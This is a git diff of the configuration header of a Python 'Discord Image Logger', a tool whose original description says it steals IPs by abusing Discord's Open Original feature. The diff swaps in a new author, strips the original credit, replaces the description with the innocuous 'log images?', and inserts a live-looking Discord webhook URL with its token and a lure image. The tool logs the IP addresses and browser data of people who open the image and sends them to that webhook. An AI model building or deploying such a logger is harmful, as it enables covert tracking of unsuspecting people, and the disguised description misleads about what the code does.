@@ -1,19 +1,18 @@
 # Discord Image Logger
-# By Dexty | https://github.com/xdexty0
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "log images?"
 __version__ = "v2.0"
-__author__ = "Dexty"
+__author__ = "puffy1"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1429989314401538158/l8t9g5f30b5mDeNiBJ5gRSTWqIs8KCTU8T8ZRjh85rV430bUX3j2dk60FUtavj6v4T2q",
+    "image": "https://wallpaper.dog/large/20538144.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by puffy1's Image Logger.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
